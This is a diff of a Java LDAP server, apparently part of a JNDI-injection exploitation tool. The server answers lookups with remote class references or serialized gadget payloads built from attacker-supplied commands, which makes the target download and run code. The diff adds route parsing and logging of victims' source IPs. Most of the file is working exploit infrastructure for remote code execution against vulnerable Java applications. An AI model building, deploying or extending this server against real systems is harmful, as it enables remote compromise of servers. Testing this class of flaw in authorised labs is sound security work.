@@ -1,8 +1,10 @@
 package com.bloom.server;
 
-
 import com.bloom.Template.CommandTemplate;
 import com.bloom.exploit.payload;
+import com.bloom.parser.ParsedRoute;
+import com.bloom.parser.RouteParser;
+import com.bloom.session.VerificationSession;
 import com.bloom.util.config;
 import com.unboundid.ldap.listener.InMemoryDirectoryServer;
 import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
@@ -27,6 +29,8 @@ import static com.bloom.util.Functions.ipCheck;
 public class LdapServer extends InMemoryOperationInterceptor {
 
     private static final String LDAP_BASE = "dc=example,dc=com";
+    private static final RouteParser routeParser = new RouteParser();
+    private static final VerificationSession session = new VerificationSession();
 
     public static void lanuchLDAPServer() throws Exception {
         try {
@@ -48,7 +52,6 @@ public class LdapServer extends InMemoryOperationInterceptor {
         }
     }
 
-
     private static class OperationInterceptor extends InMemoryOperationInterceptor {
 
         private URL codebase;
@@ -67,54 +70,62 @@ public class LdapServer extends InMemoryOperationInterceptor {
             catch ( Exception e1 ) {
                 e1.printStackTrace();
             }
-
         }
 
         protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws Exception {
             URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
-//            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
             System.out.println("Send LDAP reference result for " + base);
             e.addAttribute("javaClassName", "foo");
-            String className = "";
-            if (base.toLowerCase().startsWith("basic")){
-//                String className=this.codebase.getRef().replace('.', '/');
-                //basic/base64/b3BlbiAtYSBjYWxjdWxhdG9y
-                String method =base.split("/")[1].toLowerCase();
-                String command="";
 
-                command=choiceMethod(method,base.substring(base.indexOf("/")+1));//base.substring(base.indexOf("/")+1)=base64/b3BlbiAtYSBjYWxjdWxhdG9y
+            ParsedRoute route = routeParser.parse(base);
+            String sourceIp = result.getConnectedAddress();
+
+            if (!route.isValid()) {
+                System.out.println("路径解析失败: " + route.getValidationErrors());
+                session.recordHit(sourceIp, route, null);
+                result.sendSearchEntry(e);
+                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+                return;
+            }
+
+            String payloadResult = null;
+            String className = "";
+
+            if (route.getRouteType() != null && route.getRouteType().name().equals("BASIC")) {
+                String method = route.getMethod();
+                String command = route.getCommand();
                 CommandTemplate commandTemplate = new CommandTemplate(command);
                 commandTemplate.cache();
                 className = commandTemplate.getClassName();
                 e.addAttribute("javaCodeBase", String.valueOf(this.codebase).split("#")[0]);
-                e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
+                e.addAttribute("objectClass", "javaNamingReference");
                 e.addAttribute("javaFactory", className);
-            }else {
+                payloadResult = className;
+            } else {
                 String s = payload.choiceTypeByswitch(base);
                 try {
                     e.addAttribute("javaSerializedData", Base64.decode(s));
+                    payloadResult = s;
                 } catch (Exception e1) {
                     System.out.println("生成payload失败，使用的模块类型不正确或者命令错误");
-//                    e1.printStackTrace();
                 }
             }
+
+            session.recordHit(sourceIp, route, payloadResult);
             result.sendSearchEntry(e);
             result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
         }
+    }
 
+    public static VerificationSession getSession() {
+        return session;
     }
 
     public static void main(String[] args) throws Exception {
-
-//        System.out.println("HttpServerAddress: "+args[0]);
-//        System.out.println("HttpServerPort: "+args[1]);
-//        System.out.println("LDAPServerPort: "+args[2]);
         String http_server_ip = "127.0.0.1";
         int ldap_port = Integer.valueOf("1389");
         int http_server_port = Integer.valueOf("8080");
         HttpServerStart httpServerStart=new HttpServerStart();
         httpServerStart.start1();
-//        CodebaseServer.lanuchCodebaseURLServer(http_server_ip, http_server_port);
-//        lanuchLDAPServer(ldap_port, http_server_ip, http_server_port);
     }
 }
